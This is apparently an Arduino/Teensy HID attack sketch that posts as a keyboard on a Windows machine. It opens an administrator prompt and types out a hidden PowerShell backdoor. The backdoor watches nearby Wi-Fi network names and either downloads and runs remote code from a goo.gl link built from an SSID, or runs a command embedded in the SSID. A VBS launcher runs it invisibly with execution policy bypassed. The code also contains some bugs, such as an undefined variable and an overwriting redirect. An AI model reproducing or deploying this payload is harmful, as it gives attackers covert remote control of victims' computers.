#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif

void setup(){

  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd_admin(3,500))
  {
  reset_windows_desktop(2000);
  }

  Keyboard.println("echo while($True){ > %temp%\\gt.ps1");
  Keyboard.println("echo $nws = iex \"netsh wlan show network\" >> %temp%\\gt.ps1");
  Keyboard.println("echo $ssid = $nws | Select-String \"SSID\" >> %temp%\\gt.ps1");
  Keyboard.println("echo $nwnms = $ssid -replace \".*:\" -replace \" \" >> %temp%\\gt.ps1");
  Keyboard.println("echo ForEach ($nw in $nwnms){ >> %temp%\\gt.ps1");
  Keyboard.println("echo if ($nw.Substring(0,4) -match INPUT0.Substring(0,4)){ >> %temp%\\gt.ps1");
  Keyboard.println("echo if ($network.Substring(4)[0] -eq \"u\"){ >> %temp%\\gt.ps1");
  Keyboard.println("echo $PURL = \"http://goo.gl/\" + $nw.Substring(5) >> %temp%\\gt.ps1");
  Keyboard.println("echo $wc = New-Object System.Net.WebClient >> %temp%\\gt.ps1");
  Keyboard.println("echo iex $wc.DownloadString($PURL) >> %temp%\\gt.ps1");
  Keyboard.println("echo if (INPUT1 -ne \"null\") {iex INPUT1} >> %temp%\\gt.ps1");
  Keyboard.println("echo Start-Sleep 10} >> %temp%\\gt.ps1");
  Keyboard.println("echo elseif ($network.Substring(4)[0] -eq \"c\"){ >> %temp%\\gt.ps1");
  Keyboard.println("echo $cmd =  $nw.Substring(5) >> %temp%\\gt.ps1");
  Keyboard.println("echo if ($cmd -eq \"exit\"){break} >> %temp%\\gt.ps1");
  Keyboard.println("echo iex $cmd > %temp%\\gt.ps1");
  Keyboard.println("echo Start-Sleep 10}}} >> %temp%\\gt.ps1");
  Keyboard.println("echo Start-Sleep 5} >> %temp%\\gt.ps1");
  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\gt.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\gt.ps1\"),0,true >> %temp%\\gt.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\gt.vbs");
  delay(3000);
  Keyboard.println("exit");

}

void loop(){
}

DEFS